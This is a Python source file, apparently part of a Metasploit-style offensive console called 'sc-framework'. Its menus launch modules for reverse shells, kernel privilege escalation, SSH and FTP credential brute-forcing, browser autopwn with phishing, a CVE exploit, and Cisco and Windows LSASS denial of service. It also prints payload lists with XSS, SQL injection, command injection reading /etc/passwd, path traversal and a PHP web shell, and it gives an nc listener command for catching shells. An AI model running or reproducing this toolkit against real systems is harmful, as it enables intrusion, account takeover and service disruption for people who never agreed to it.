        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitreverseshell()
    elif scconsole39 == "clear":
        os.system('clear')
        mexploitreverseshell()
    elif scconsole39 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy your ip address.
LPORT            | specifiy your port.

you will specifiy these options when you run or exploit it!
""")
        mexploitreverseshell()
    elif scconsole39 == "run":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "exploit":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "unuse":
        print("unusing multi/shell_reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole39 == "exit":
        exit()

def osxkernelxnuipfragmentprivesc():
    scconsole40 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc)" + color.white + ">")
    if scconsole40 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc.")
        time.sleep(0.5)
        Console()
    elif scconsole40 == "exit":
        exit()
    
def osxkernelxnuipfragmentprivesc2():
    scconsole41 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc_2)" + color.white + ">")
    if scconsole41 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc_2.")
        time.sleep(0.5)
        Console()
    elif scconsole41 == "exit":
        exit()

def oexploitsshlogintest():
    scconsole42 = input("sc~" + color.red + "(osx/ssh-login-test)" + color.white + ">")
    if scconsole42 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitsshlogintest()
    elif scconsole42 == "clear":
        os.system('clear')
        oexploitsshlogintest()
    elif scconsole42 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        oexploitsshlogintest()
    elif scconsole42 == "run":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "exploit":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "unuse":
        print("unusing osx/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole42 == "exit":
        exit()

def oexploitftplogintest():
    scconsole43 = input("sc~" + color.red + "(osx/ftp-login-test)" + color.white + ">")
    if scconsole43 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitftplogintest()
    elif scconsole43 == "clear":
        os.system('clear')
        oexploitftplogintest()
    elif scconsole43 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        oexploitftplogintest()
    elif scconsole43 == "run":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "exploit":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "unuse":
        print("unusing osx/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole43 == "exit":
        exit()

def lexploitsshlogintest():
    scconsole44 = input("sc~" + color.red + "(linux/ssh-login-test)" + color.white + ">")
    if scconsole44 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitsshlogintest()
    elif scconsole44 == "clear":
        os.system('clear')
        lexploitsshlogintest()
    elif scconsole44 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        lexploitsshlogintest()
    elif scconsole44 == "run":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "exploit":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "unuse":
        print("unusing linux/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole44 == "exit":
        exit()

def lexploitftplogintest():
    scconsole45 = input("sc~" + color.red + "(linux/ftp-login-test)" + color.white + ">")
    if scconsole45 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitftplogintest()
    elif scconsole45 == "clear":
        os.system('clear')
        lexploitftplogintest()
    elif scconsole45 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        lexploitftplogintest()
    elif scconsole45 == "run":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "exploit":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "unuse":
        print("unusing linux/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole45 == "exit":
        exit()

def treversehttp():
    scconsole46 = input("sc~" + color.red + "(site/reverse_http)" + color.white + ">")
    if scconsole46 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        treversehttp()
    elif scconsole46 == "clear":
        os.system('clear')
        treversehttp()
    elif scconsole46 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target url.

you will specifiy these options when you run or exploit it!
""")
        treversehttp()
    elif scconsole46 == "run":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "exploit":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "unuse":
        print("unusing site/reverse_http.")
        time.sleep(0.5)
        Console()
    elif scconsole46 == "exit":
        exit()

def sserverbrowserautopwn2():
    scconsole47 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
    if scconsole47 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "clear":
        os.system('clear')
        sserverbrowserautopwn2()
    elif scconsole47 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target URL.
PAYLOAD          | specifiy the payload you want.
PHISHING URL     | specifiy the phishing url.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "show payloads":
        print("""
<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

<a href=javascript:alert('XSS')>Click Me</a>  ---> cross site XSS Click Me payload.

javascript:alert('XSS')  ---> cross site XSS javascript payload.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "run":
        targetsite = input("URL: ")
        payload10 = input("PAYLOAD: ")
        phishingurl = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite} -p "{payload10}" -ph {phishingurl}')
        sserverbrowserautopwn2()
    elif scconsole47 == "exploit":
        targetsite2 = input("URL: ")
        payload101 = input("PAYLOAD: ")
        phishingurl2 = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite2} -p "{payload101}" -ph {phishingurl2}')
        sserverbrowserautopwn2()
    elif scconsole47 == "unuse":
        print("unusing server/browser_autopwn2.")
        time.sleep(0.5)
        Console()
    elif scconsole47 == "exit":
        exit()

def sserverextracttabledbcolumn():
    scconsole48 = input("sc~" + color.red + "(server/extract_table_db_column)" + color.white + ">")
    if scconsole48 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "clear":
        os.system('clear')
        sserverextracttabledbcolumn()
    elif scconsole48 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target URL.
PAYLOAD          | specifiy the payload(you don't need to specifiy it uses own payloads!).

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "run":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "exploit":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "unuse":
        print("unusing server/extract_table_db_column.")
        time.sleep(0.5)
        Console()
    elif scconsole48 == "exit":
        exit()

def lexploitvulnerabilityfind():
    scconsole49 = input("sc~" + color.red + "(linux/vulnerability-find)" + color.white + ">")
    if scconsole49 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "clear":
        os.system('clear')
        lexploitvulnerabilityfind()
    elif scconsole49 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "run":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "exploit":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "unuse":
        print("unusing linux/vulnerability-find.")
        time.sleep(0.5)
        Console()
    elif scconsole49 == "exit":
        exit()

def tcve202224521():
    scconsole50 = input("sc~" + color.red + "(site/cve-2022-24521)" + color.white + ">")
    if scconsole50 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tcve202224521()
    elif scconsole50 == "clear":
        os.system('clear')
        tcve202224521()
    elif scconsole50 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specifiy the target ip address(website IP Address).
LHOST            | specifiy the listening host.
LPORT            | specifiy yhe listening port.

run this command in another terminal after specifiying the options ---> """ + color.green + """nc -lvnp <port>""" + color.white + """
you will specifiy these options when you run or exploit it!
""")
        tcve202224521()
    elif scconsole50 == "run":
        rhost4 = input("RHOST: ")
        lhost4 = input("LHOST: ")
        lport4 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost4} {lhost4} {lport4}')
        tcve202224521()
    elif scconsole50 == "exploit":
        rhost5 = input("RHOST: ")
        lhost5 = input("LHOST: ")
        lport5 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost5} {lhost5} {lhost5}')
        tcve202224521()
    elif scconsole50 == "unuse":
        print("unusing site/cve-2022-24521.")
        time.sleep(0.5)
        Console()
    elif scconsole50 == "exit":
        exit()

def tinformationgather():
    scconsole51 = input("sc~" + color.red + "(site/information-gather)" + color.white + ">")
    if scconsole51 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tinformationgather()
    elif scconsole51 == "clear":
        os.system('clear')
        tinformationgather()
    elif scconsole51 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url.

you will specifiy these options when you run or exploit it!
""")
        tinformationgather()
    elif scconsole51 == "run":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "exploit":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "unuse":
        print("unusing site/information-gather.")
        time.sleep(0.5)
        Console()
    elif scconsole51 == "exit":
        exit()

def tportscan():
    scconsole52 = input("sc~" + color.red + "(site/port-scan)" + color.white + ">")
    if scconsole52 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tportscan()
    elif scconsole52 == "clear":
        os.system('clear')
        tportscan()
    elif scconsole52 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url.
START_PORT       | specifiy the starting port.
END_PORT         | specifiy the ending port.

you will specifiy these options when you run or exploit it!
""")
        tportscan()
    elif scconsole52 == "run":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "exploit":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "unuse":
        print("unusing site/port-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole52 == "exit":
        exit()

def dciscodos():
    scconsole53 = input("sc~" + color.red + "(dos/ciscodos)" + color.white + ">")
    if scconsole53 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dciscodos()
    elif scconsole53 == "clear":
        os.system('clear')
        dciscodos()
    elif scconsole53 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
IP               | specifiy the target ip address (Cisco IOS software router IP - Internetwork Operating System).
TTL              | specifiy the ttl (Time-to-Live).

you will specifiy these options when you run or exploit it!
""")
        dciscodos()
    elif scconsole53 == "run":
        routerip = input("IP: ")
        ttl = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip} {ttl}')
        dciscodos()
    elif scconsole53 == "exploit":
        routerip2 = input("IP: ")
        ttl2 = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip2} {ttl2}')
        dciscodos()
    elif scconsole53 == "unuse":
        print("unusing dos/ciscodos.sh.")
        time.sleep(0.5)
        Console()
    elif scconsole53 == "exit":
        exit()

def wMS04007LSASSexeProRemoteDoS():
    scconsole54 = input("sc~" + color.red + "(windows/MS04-007_LSASS-exe_Pro_Remote_DoS)" + color.white + ">")
    if scconsole54 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "clear":
        os.system('clear')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
LPORT            | specifiy the port.
NETBIOS          | specifiy the netbios.

you will specifiy these options when you run or exploit it!
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "run":
        lhost54 = input("LHOST: ")
        lport54 = int(input("LPORT: "))
        netbios54 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost54} {lport54} {netbios54}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "exploit":
        lhost55 = input("LHOST: ")
        lport55 = int(input("LPORT: "))
        netbios55 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost55} {lport55} {netbios55}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "unuse":
        print("unusing windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        time.sleep(0.5)
        Console()
    elif scconsole54 == "exit":
        exit()

def ltcpdumppacketsniffer():
    scconsole55 = input("sc~" + color.red + "(linux/tcpdump_packet_sniffer)" + color.white + ">")
    if scconsole55 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "clear":
        os.system('clear')
        ltcpdumppacketsniffer()
    elif scconsole55 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "run":
        lhost56 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost56}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "exploit":
        lhost57 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost57}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "unuse":
        print("unusing linux/tcpdump_packet_sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole55 == "exit":
        exit()

def pRCEviaPHP():
    scconsole56 = input("sc~" + color.red + "(php/RCE_via_PHP)" + color.white + ">")
    if scconsole56 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pRCEviaPHP()
    elif scconsole56 == "clear":
        os.system('clear')
        pRCEviaPHP()
    elif scconsole56 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address (website).
LPORT         | specifiy the port.
COMMAND       | specifiy the command you want.

you will specifiy these options when you run or exploit it!
""")
        pRCEviaPHP()
    elif scconsole56 == "run":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "exploit":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "unuse":
        print("unusing php/RCE_via_PHP.")
        time.sleep(0.5)
        Console()
    elif scconsole56 == "exit":
        exit()

def OSconsole():
    scconsole2 = input("sc-" + color.blue + "system" + color.white + "~>")
    os.system(scconsole2)
    if scconsole2 == "back to sc-console":
        Console()




def main():
    start()
    Menu()
    while True:
        Console()


if __name__ == "__main__":
    main()
